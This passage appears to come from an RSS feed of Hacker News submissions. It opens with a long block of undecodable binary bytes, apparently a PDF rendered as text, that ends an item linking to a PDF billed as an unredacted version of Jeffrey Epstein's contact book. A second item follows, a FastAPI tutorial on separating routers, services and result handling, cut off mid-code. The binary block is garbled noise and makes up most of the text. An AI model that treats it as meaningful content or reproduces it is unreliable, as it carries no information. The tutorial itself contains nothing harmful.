H£6êrÿ€ä8éÿ)¿ðA	…Ù.ø‘E!ýýÖ�ñB¤`Ýu|hžRÛÙCh+g´xÐ'6’èÃÔá±Ãáµ›Ü¿×‚užØƒkÍ¬J—,�vsî˜·Nž<hg«\ð Ñ;÷©yèŒ°zdbãªž¼Í‹¥ÇÇõž×�'="" k‚vÂƒÕ‚ }yaq*="" ¸�Ÿurg‡z„·3ù'…›5­^ùÖú¿§ÏÊÏ‹˜�¦èàcÝÝ¯=""> ×»™OicUƒŠ==¾ÖHƒCÄWåe¢ãv�šƒ)Wé¡+§ö¼’aôöíò²g3Oœ¸"ÿO¬€8’5Sù†Æ�AgQÏgâIÆÂè}EÞÁ&lt;úvX1züˆ^»Î©x—.Pµ(†“ÀZ‘u
ûŒakED
�Z'
ŒJÿˆI,ÆåCð”µe:ìL8Ç&amp;(Šç9+#3Ó´õ&nbsp;í¼2$ÕwPeA¦
ö—å,{†dƒ	_e<xáid�n=fëdý¨Ó ·±ÏÇ$Ìë]Üú}— 5k="" í;ig˜ã±–¥ÞiË”n“÷™ßØ="" rpr´k="" Ê³l wà«bÓÐf[É*nþ5~¸Åh="~">W‚:U°×ŒË²C¿ê�uí�×ÈšT¡Ž§“NªéOÜú4¡7fÝw…Ë¿»?9?"X/:‡vèˆ5Á‘Í´™2&lt;�J„‚÷Î3ñ/Ó¥ñ…CŒÿ© O/�q³ù3|ÿZ·µÐ@…¡:*äñ}pù¶ãH5�Ëñ›UêÉø&amp;IðQŽ,iÏ°‘ë¥  kâUíŽ£ØÌ«¡Æ�P¹+ë»N¯æ|³F:’Ð6Àz/´4T&nbsp;pþŸ©$Ñ•—R´8[¡å{n‚tùí,ZáÉ44§cÖùù¹ÈF[š#ÊÈiî¼¬‡iÅ(™‚Ysì«”ÛJ~eX+]Â.IªóÕÌÛõ¾O~íî¶4Ì ßÞ&gt;Žn4W@‚SH_ëŸ»&lt;ÿ�œ¾®dK#ºÉo’½`!u$tÇ&nbsp;f·c©«hrÏÑÎ7ßê…í7Ñ9×Zí'¢r|Ú‘~ð’	‰JÞLÈ!Ó¦½ü2•cE×¿Â°ñÉÿ‚~Ÿ»äesYbC”�&gt;œa-e&nbsp;§èŸ6K‰ÇŸþ’*×šò	�ÉužàÃÂá­ZÃI&lt;Ù£Ðº}¢ã1=?vÐêUL?™Çª
‘Iì‹ñkˆ1æ°ç&nbsp;ÃK·J�H5ÈÖ
WbyÕ‹µà@úËè##§ýjÛØ¤Ímq3?;/sZ&amp;r±ÉçÅ*õPºí&amp;Oÿ\�•I©ûa¸:Ž7ÅeÑ–_Q-Çé„F•-¹:i‚®H³úzËý+±•¨v
BCq¼zmÅ´ûØbõKébÈ}P­œš8èøTÄ$?ëS¥I�zâ‰Ù:þ¶IVŠ£ÞN…´þ-[GÇ˜â˜œDVäRPnT,¾À`E­w™Ìó³Í”&gt;7¯88Ž¾|Íñi áAïf¾ÉËÙ[‹
mü’|»:…b¯Š‰a'@À¼'Üè37ÀzÄ÷Õ•TÑc T,¤2Ý™_c¦Ås¤1oT~JÆªM·tƒ^èüØ…¤p8q­¥¹&nbsp;&amp;ËÇM1·òÒ¸ãÅÎåÕïD&amp;œ
‰÷©K­É­¶Š.V�Kx.ïÊãâŒÂiÎ
K|_˜FCâ¬€tÝ8£+))¢•‰kŒ	ÇâjøYJC­£ùEO��¤ý‡à8ÚL¼ú©`9+ZÿmÙ`lÑ
gŠ_4—ÊªœÉÈÀ®
–ìµÄqF“‡£r÷Ì�­ôTòx`¸�£ú¦Â5àô?2åõþBá3O[@bI†/Øö×ÖPÁˆùnIT&gt;qiTt-5ì®‘yúA6˜_Ûƒ*zêóÕŠœ˜­’‚¨�dHI¶~P‹&gt;öGrµ¸w†”ð™aëò&amp;„‰Ù6Ô÷{ÔÞ.†ž†3íÝg{“\Ç½31‰ý-¥
DxNŠe’~rr½ó3ž1Ð�'
¨XÎßÆ9dSâ|í,Ùfrt\üýLA—Ô¡ÆÌ±…YZ71­¸Vš&nbsp;Ž.6zª‚²Û•‘+þ2ÛBU¨¦è‡æó|ä=ø
¯#Í’GÜzÿx~¬j�¾�‡ÜŠÌKøÇ¼qu&amp;l‘%Xº~úk4j)\¢‡úHX¦çãˆº@Íe‹fƒàÓ]
ã“âØ1â0Tùc­ÙX¼ºÍ}/�ÈóU/Jg_�âøõudX¸¸�&nbsp;M’kC‰+êÇ�CÔŽ~ãâ£ý¸œ‚CœIg05³�&nbsp;å`wÎ×ò• &nbsp;1�Ô2kˆ”Ê5%Î-õc„XBC•“ÕÕTdÐ]��À„åÎâÀ4‹/V2jŒ+&gt;E{x-½ £4¨çS76F8ýO,Ô©ÄœEsÎÁ®Ú’ÑÀ®Ÿ0Wy”Ÿ²cXÕåë%©¨ƒf�#å´”fu“#½
Ê�­‡4Ò0[¼á©U×Å%(²±)ž*“†*Ë�å32)&gt;|KNF7¿š
Œ‡5Ô—¯2È¼&gt;%£´ñØÅ"Ò&gt;q[ÈH£èâ™‰{˜Nôø·yÑ“?`+?árÒè’:~#O&amp;ÖW éÌ�ã4ÐCsr•X4¬©ïÆ¹…­ 1Á„Šú6Ïy´Áå„ÐðÎ•{ÂáçB²jèæF¬±½¸u§žG©øhòâŽ$°+By·Ôãæi%GYùê…±ÞÆ�:9+‚¹]ŠÕl—šØ.Ã1À]³wû¾ìEWãŸÌ¬Á1�¢á$x˜˜÷áÅ!@YLs€$ù±!£[ökË3åyÊì_Ò¸o7½œóÕ‹ˆ‚Ió�§Á°z‚(‘D‰×}}lÑŒnO¿!|,Ç�U°uFA.ƒXLÿ"Í0ÚÜþÀt·¼üÝ�Po�¬Øì1QÙT:Ûb¥EÏRCÞ¬Ž[¦p$z¸ª•Ïdº…¨þ33ßªÔÿiþ3-æ2EJOW;ÑkKì;'m’•ÂTfoÌˆð›,ˆÇåép¹Ùû1‚{þ4·–T7Ý”×úy&gt;•±p-1V‹n*„KkÀC0-VLl«&lt;˜PÍ½ÇýF3zsÝ•Ê»‘~³ë¨uÎ�ÏÙU¶&nbsp;ëÑZËÿg“ð
þõÍ´b7»‚|)Z3¥ÐvrÈ%Ö­¤+ÆÉOû‘šéÐÕHÉ©b‡ÒUhH�¾àëÍS
·X·fpDµkT1E�Ìe�nî2»úU»�§ú.5ï˜ž&nbsp;Ï¬�×ôñªxZ{ªk•T
3Ôë/šÈˆAiA»$Ìºöµ�ÈÓ´ü=¡Fb¹3^B‚A«ýÅÉÞXç“-Ñ¤#tÝŠfö‘æ�Si®ðálc‹(ž&nbsp;Vœ+*wîÙþ
�&gt;OCåle&gt;O‡yö—=®Êès€Ê[íIwÜf´Ò,îå¼MÉÊ´B–xåÀ*3wráÄÎ™T€ßÐÂxº—Þ·È ^"�­’ìˆMuùÑNi’³œ.U�Ce;Úã-³oä,þÜB8WlÀLy›×„Eî¦Ö¤Œ-Ã¢?Õ§®íçÎõ©Z‰Htó&gt;­Î:
Ü8!:ŒJNÝ&nbsp;^~tµ|´—Ów	ù)¶ñí~&nbsp;Mÿla²®‚&gt;kk ¿-Ù\§DWµÈK’«Ù^ð¾íwÉš¿ y�ÄCtçQêŸ@^u»\7®�V•¥;D
Ê‡	zÓ\«wî*©CË$@UAfGc7#F¾„OsÉ±pž2
¤®	È²�è*kGh¶ƒ	?AíÙ³#ÜÒÍ±Ö]_Ps•A¾.Á‹R½gÊ”—'zwÙ÷º4pLd°ê"÷(8[êOÌÂ^½XÉeÐ#\Å¢Í_Õæ„ï„äjÁ†Ë…kªcdüØƒ…æœ©p—Á/#Ÿ³&amp;²Ul­VbUÙl|g$ÜÚùœàÐ\ŒCX¥0TV¤Ûìþ8©&nbsp;xÌ•Íñú8
&gt;Y}]Ë&gt;ßWvU£h. `‚—}3¸3”|â—_™¡œOî3�Føt«‡ÝM$•‘ža~Ózìø¾ox©f«íq&gt;GÄÔŽ;ìÐŒJ`Á3Óâ™§*�,¶E³"Sÿ›y
�¤µ;h�Ž1}¼Õ«éû¹ÃYÐ¬ßHÜÑ“‘:CQYÔ±»ÅËêŠ‰íRfqÜzöi;NFOµm¥’
õ¯kÎ®o½÷£8õ7e‡Ö%åx5ÉP‘xeJ€¬–’Bõd/Xž˜$'Ú¿I1‡‰Õ†éó™…rÃ¢«‡›”Ãâ¸º&amp;hÃý!WÒ ÊËíÇÖfÁ�º˜4„r{¤åfÿTøIMnØ°©[qD*.$²“å´S
Ð„!à� _cå…¦Ä`/a¸ž¾XÑ{vÐù|�øsµx	\aQ›0õ9òù5yø›Æ÷JO5›äM‡wšmñ]Íâ#zVüûd!lˆ×Ã¡EŽÿ×à'Ì+_Žµ–éó[GÒ#å%ŒT0å”©ˆJÄ[	yÃÌ’�zçw)úW»bqÎkÓ?‹ßÒÄÍo 9®#‹‹€‡‹`ÇêÇuÆ‰I¡ŒKUi3b›-�Q÷.ÞÈnXý&amp;·ðh˜réüNbh+=M[}ížÅ­Ü…&lt;¾žÞÈó–nÛU¸(œ?@ÔÑÒQ{É2ú9+3@ŠëìŸhXÀˆ¦0üLÊ¶Kðs�iû]T¶_ƒ÷y·Ã¸àJ¢–n‰Œ�ñRf 1áxþ½òÂT¼·	ú×Jc
ÊMúÄLQG´™í”¤­äÑ¨îªêŸ‡S†Á%„9»4¼„Åˆâ&lt;ŒqJuHB±[ [Ù}�òPh;§ÈýAr.²T…ùƒCº6¡¡üèÇLZIl¼7¶íË”Ét&nbsp;œÒ&nbsp;‡Á7"ôY¦à,L‘¼“ºË6ÉØ»¨¹ƒ±Ç‚–à‘^ƒ“æ¨ŸNYŸÀ€B†
|*}œ:;DïS¹
ö¶ô0ž8^¿ùÞàþÚxŒR´«{÷“Ð[GZy›PVD×9TBðÇ ¾•DˆåaåÙîM¶ë¾À6æªûBLéˆªË¦ËÔÒ‘G¥C¯%V†iy£'BþjæÊó&lt;ÜèYlM×9¬"šÃfNplª’œ)²	þ}©Í"ðÊÑcJ3fII�æ
	ùü&nbsp;Uçk,Ò 7�ÀÇ}'¼ÙÓù]½0Ñiw£v¦{»Î¤ÄqC#zÄN{t³.¼t®˜ƒÍ¹p–�_à¬*&gt;…ºÉÚÐ¦ißæ2´'´ d`Êœ,Õ†×&nbsp;ŒÅïpn:.‡›)kW”�{ÍÉ×Ç*¤I¸s/tRÐ·ëTã¬ÜñõÅ)2&lt;þ5å5+™ï^i°,ªnÿ§Æ9QaUEpÝO%~‘—ÂD÷W�n»²ìXCù}%f&gt;»â=wÓõÓ…Þ8SS¢…hJ•–û%Ç\ýÀãRúL½Ë¶X�;cÙÓ�vþxBf4èÄãQ±úuëKÅ]×/Å�{â:ùwÏòÎ=Œ°€º©û�Q„‚ð-	ªêmï·‹Î€~ÌÊ QUÌÁM§Ù™&gt;Ú†RAË`6a“ –`¦ZOôŽŽEßGùe¤žJoÅ&gt;•D¶Ý‰À H$còÏOîgã¿µ'X<dÖ-Ü*ÉlêÊÄô_\Š°ÎÉ+Ú(¨ £ŽwÂ�þÍÉÉ½dþš:¶7}#ïuõ%�Œi�'¹à="" fž�nzcç�ß;û«˜ö�¸i¨0ºsí<�¨¦³!&jÈ„us‰·µ)="" .Â.g.’»òö#!#ÜªÝý®”©Ž—_@uÒbmäoý‰wÍb–—�‚`��‡;µai”Óy¹Øí!po"³¤nbå­í5Øg4&ðeåÐçÞl7%©£ Ú3�m0ø'¢¦­€ñî\qõh¾ŽŸbü¾€="" ks¨o¢‰ªÉ="" âÓ}Œyž£m1«cÏŸmœÚ1ew�nñ�tñx"¶gšõ¢="" @òbµb£™w‰cÎÂlê,Œ8Ñ’ßödpŸ�w¿Ä¤ü¥£²fÅª4»¢r%h.ŒŽ÷3h�.ký¶Ø·fƒžÔ­Í*fnÅ#ÆŸ¹¸'7ÃŒ@r`Ü~…ÅÊlÐààcÓ:f�u="" yº®{×z†w[é�œyµ-yì˜:oµ›âwë»="" �«4�û×« ò-�="" á»rõ%u(ô£%¿oºÃ·s�­5¾þ³�õûým…°á`¸ˆì²wâ�¥ß Ö•Ÿ¸u\ìp~Ð§~8'Ä¢Þ|s‡€»ç˜ò_|2²Ÿa£ð–äy”Œ="" u‡ÀõÔ{q¦kõ¥�ú¦!‘|yì�—ø(f3“µ¶x¨nô1’Å‹Ç…mõïýÑjr2–dØ3§‚©z58‰Úm®="" zn&¥~¹ÈÿdÔ_f£Æ¼eø|µÿiµÔ}sÖ!°="" keöÃ9ì="" Ê±hí–ï�k™?Äe39úë#Ó,5õ!¿³¤ôiuÃŒ(oÂqÌÙ\©ºÁ’øq•›mÂ="" t#;34d~ñ�­ãnn†]é<6="×Š‡PÈhì9–ˆKDK¤,á¨A.sª" ‰ËÙbÁ§ho2î&‚(ì5="" ÅØ†Ÿ’y¬ünÁ‹víó“ÿŽ5�"ùÜ–q}�lÒë,€µÕµÃŸ="" ÔÙÙ:®[!="" ¥="" ÷t¸)s&®Ÿî^3ÈpÞ­�="" $i’ÿ¼Ùt¸®Þr“="" t©hslr_sÝ¤Âk="" ¡¤eÏÛ„�aÊþ�pe–1ŒÎd¹="" ²Âeº3�¤òq²��ŠÌÃ¾�“�bÕŽÓÃ¶±i{"Îø©u="" m'Ê¥ýûÌ†ãØfúªu®‰¤z¿ËŽÉëo^v–ÿmÖßÒÆÚs,†wg¿Ç÷sr.æ�´˜k$8…u\o´å]£_åÓÙÿeÊîäüŸÆ@~�¶ù%cÏ_(§íÂ�þè��jðãjk[¡ƒ="" ø•m:¾´fc7íÅ”ã²¯—sœ<.ô�Ç¾;9Îš7="" –‰à kª§%="" ;%&e+z!�p^s]n]ýs×Ô½¦yÐ ˆÖ1dg›="" iwþl„¬="" $ªÏÜ¼\Žxa^7·zþ~xkåeÍÅy°‡!Ó�uxÌŒm`:¡»Èçcxþø="">ÎÇ™ïç•wŒ6”'ú0ê“I‰š£öY&lt;[Ã»¥ð¢Ž—LÝ&lt;	ä7Ó­{¡IÈz9¯åW{¥#3VäóGvÓÑ·Ó*f¬0Z?ÌîÅš�\o¨6åˆÙ%ÉÈØ÷Í	G¡&gt;SÆøTN±‚°ÞÕ˜{º”W–È<!--?.¥ê`“ÄÑ¨ÄlàçœÚ@šŽD”x[\Iw´}–Þ³$œb�ß9¸`òåwS¡ô÷ä6~í�Gm+;-->±Yá!.ƒæüS	³W&nbsp;Ä1 Ý/¼ôšÿZ]¼â"™5ñëO8F¹—óbãxò˜òUA¦.eiè3#ù^ÆZÔL‘VtŸéR5-z!O§1HêPŽÂ»6í:ÇÜJ¡ŠÅ¤`+Þ$¨ihªƒ’bîÈÊ=U§°$q®5 £ˆ"öR&nbsp;.‹RŸäû3©†ýÃešt.èA#%&nbsp;×ÿ.}WæjŽD�©Ê—!zC|ñÙ˜'`DFS6†ñO=à·uá^…»LÃI·fb´^;˜4£‚.dšÝH2¢íò¥ð—ªãzbÐU~­À	ƒ¢=‘Ž¼¹‘�®ø+b¢«(H\|ºl3k°u%4MŒ‘Ó‰6\R;
}�ÿ'¨œö÷t?ÿôPµÆ´Jf^%	�vÍþ]ic3=–°²ˆ	`=+ð¿³Ž³6c8ÔÈ€*®â\V¡{ïÄâÑq¡¨„3íUíÀšÚA„Þ›m!(_%\H^àåºDÃRÄÎ¦:„'N.¾ò¨¥‹�[USÕ†�KåiÜo.º7‚g|Ï&nbsp;'ÑÔó&gt;Rþÿ4=}Ð†DôhÐvÔ½:öx4hò;¯­˜Òeùù²àE„õîJ•\)í­†Ô0¹¡Ó?8Ï¸\ñ–£ÛŽ¹4Ê”ä{bœÜ—î“Q¶?XŒÂîdþr{óPÓ'P«ç–p»·Ù½uT^•|_Ôš7ú”²òah¬4ð¾Ý¯nÿY"¬WÛZÎõ¨l&nbsp;]çµ‚|Áóýýýûö¼ŠkÐ†±�é‹#¬]	ÖþóÓ5ûÍÑØ9–=
‘2˜3(±ÞÜ&gt;eÊQ;¿È	üÃÌXÓ¾É•¨‚Q=“×jÞtÉ¤õ}Ç-cW&gt;&amp;xx°±ƒ8]S,“Óé¬}§y2=ë]49*qw!ÈT{_3èçKq§šâ(ê&nbsp;Vm{TwL»…</dö-ü*élêêäô_\š°îé+ú(¨></xáid�n=fëdý¨ó></hg«\ð></d<îjtdäð$w %ò\ms§0¼aòª7e™²l></jpäíw”<âp></v±¬giu•-_×rú#[ýÿ=�¹òs•â)eýæy÷7<‰ø¬l±ô"f></q¤áúrƒ†ìêniä…âj!bœ></tìþþný6></m£-dn¤,r¦ë¤]:ù0ßôé(€`^fcy”&éia0ò„v9uøüwcö©�;›÷nf­¿ä„~hûvâ»ifƒò></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf">https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf</a></em></p>]]>
            </description>
            <link>https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25797773</guid>
            <pubDate>Fri, 15 Jan 2021 23:06:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing FastAPI Services – Abstraction and Separation of Concerns]]>
            </title>
            <description>
<![CDATA[
Score 63 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25797140">thread link</a>) | @jdnier
<br/>
January 15, 2021 | https://camillovisini.com/article/abstracting-fastapi-services/ | <a href="https://web.archive.org/web/*/https://camillovisini.com/article/abstracting-fastapi-services/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-3d5c50e8=""><p data-v-3d5c50e8="">This article introduces an approach to structure FastAPI applications with multiple services in mind. The proposed structure decomposes the individual services into packages and modules, following principles of abstraction and separation of concerns. The code discussed below can also be studied in its entirety in a dedicated companion GitHub repository.</p>

<h2 id="fastapi--building-high-performing-python-apis" data-v-3d5c50e8="">FastAPI – Building High-performing Python APIs</h2>
<p data-v-3d5c50e8=""><a href="https://fastapi.tiangolo.com/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">FastAPI</a> is a fast, highly intuitive and well-documented API framework based on <a href="https://www.starlette.io/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Starlette</a>. Despite being relatively new, it's gaining <a href="https://star-history.t9t.io/#tiangolo/fastapi" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">strong adoption</a> by the developer community – it is even already being adopted in production by corporates like <a href="https://netflixtechblog.com/introducing-dispatch-da4b8a2a8072" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Netflix</a> and <a href="https://github.com/tiangolo/fastapi/pull/26" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Microsoft</a>.</p>
<p data-v-3d5c50e8="">Following the <a href="https://en.wikipedia.org/wiki/Unix_philosophy" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">UNIX philosophy</a> of <em data-v-3d5c50e8="">"doing one thing, and doing it well"</em>, separating parts of the application according to their task improves code readability and maintainability; ultimately reducing complexity. The main benefits of structuring applications in this way:</p>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Separation of concerns</strong> – Decomposing the application into modules performing a single job. This allows accepting requests (top down: controller → service → data access) and returning responses (bottom up: data access → service → controller) with a clear separation of what particular functionality should be implemented in which particular module, reducing cognitive load for development.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/6c6e6d1a9a2252c24c72049f74382abee765095c/9408a/_nuxt/img/request-response.df4b985.jpg" width="100%" height="" alt="Request-Response Flow across Application Layers" data-v-220acfa8=""></p><p data-v-220acfa8="">Request-Response Flow across Application Layers</p></div>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Abstraction</strong> — Components of the application are designed in a reusable way. For instance, <code data-v-3d5c50e8="">ServiceResult</code> is implemented as a generic outcome of a service operation (which may be successful and return a response, or unsuccessful and raise an exception) able to be used by all services of the app, keeping code <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">DRY</a>.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/fc6bd09df8db15e783bd11117eba8003350f04cc/465f4/_nuxt/img/directory-structure.0c63d71.jpg" width="100%" height="" alt="Directory Structure Overview" data-v-220acfa8=""></p><p data-v-220acfa8="">Directory Structure Overview</p></div>
<p data-v-3d5c50e8="">The granular nature of namespacing allow to distinguish parts of the application, e.g., routes versus business logic belonging to a particular service – grouping similar tasks together, while keeping distinct parts separated. Four principal packages are needed. For each service, one module is added to these four packages. For instance, a service called <em data-v-3d5c50e8="">"Foo"</em> requires the following modules (discussed in detail below):</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./routers/  foo.py </span><span data-v-3d5c50e8=""># Router instance and routes</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./services/ foo.py </span><span data-v-3d5c50e8=""># Business logic (including CRUD helpers)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./schemas/  foo.py </span><span data-v-3d5c50e8=""># Data "schemas" (e.g., Pydantic models)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./models/   foo.py </span><span data-v-3d5c50e8=""># Database models (e.g., SQLAlchemy models)</span></span></code></pre></div>
<p data-v-3d5c50e8="">The four principal packages are complemented by two generic packages which contain application-specific (and not service-specific) functionality, such as configuration or utility functions.</p>
<h2 id="controller-layer--routes" data-v-3d5c50e8="">Controller Layer – Routes</h2>
<p data-v-3d5c50e8="">Within <code data-v-3d5c50e8="">main</code>, the application is instantiated and all routers are included. Additionally, middlewares and/or exception handlers are implemented. The example application discussed below is based on a service called <code data-v-3d5c50e8="">Foo</code>, which requires a number of routes. To handle custom exceptions occurring at the service layer, as instances of class <code data-v-3d5c50e8="">AppExceptionCase</code>, a respective exception handler is added to the application.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8=""># ...</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">from</span><span data-v-3d5c50e8=""> fastapi </span><span data-v-3d5c50e8="">import</span><span data-v-3d5c50e8=""> FastAPI</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">from</span><span data-v-3d5c50e8=""> routers </span><span data-v-3d5c50e8="">import</span><span data-v-3d5c50e8=""> foo</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">app </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FastAPI()</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">@app.exception_handler</span><span data-v-3d5c50e8="">(AppExceptionCase)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">custom_app_exception_handler</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">request</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> e</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">await</span><span data-v-3d5c50e8=""> app_exception_handler(request, e)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">app.include_router(foo.router)</span></span></code></pre></div>
<p data-v-3d5c50e8="">Routers and their routes are defined in modules within the <code data-v-3d5c50e8="">routers</code> package. Each route instantiates the respective service and passes on the database session from the request dependency. Handled by <code data-v-3d5c50e8="">handle_result()</code>, the service result (either the requested data as the result of a successful operation, or an exception) is returned. In case of an exception, instead of (and before) returning any response, the app exception handler in <code data-v-3d5c50e8="">main</code> picks up handling the exception and returns a response.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">router </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> APIRouter(</span><span data-v-3d5c50e8="">prefix</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">"/foo"</span><span data-v-3d5c50e8="">)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">@router.post</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">"/item/"</span><span data-v-3d5c50e8="">, </span><span data-v-3d5c50e8="">response_model</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">FooItem)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">create_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">item</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> FooItemCreate</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> db</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> get_db </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Depends()</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    result </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooService(db).create_item(item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> handle_result(result)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">@router.get</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">"/item/</span><span data-v-3d5c50e8="">{item_id}</span><span data-v-3d5c50e8="">"</span><span data-v-3d5c50e8="">, </span><span data-v-3d5c50e8="">response_model</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">FooItem)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">get_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">item_id</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> db</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> get_db </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Depends()</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">    result </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooService(db).get_item(item_id)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> handle_result(result)</span></span></code></pre></div>
<h2 id="service-result-class--success--exceptions" data-v-3d5c50e8="">Service Result Class – Success &amp; Exceptions</h2>
<p data-v-3d5c50e8="">The <code data-v-3d5c50e8="">ServiceResult</code> class defines a generic outcome of a service operation. In case the operation is successful, the outcome (or "value") is returned contained within the value attribute of the instance. In case of a custom app exception, the service result instance contains information about the raised exception (e.g., which status code should be returned to the client).</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">utils ›</span></span><span data-v-594b4fde="">service_result.py</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> ServiceResult</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__init__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> arg</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">isinstance</span><span data-v-3d5c50e8="">(arg, AppExceptionCase):</span></span>
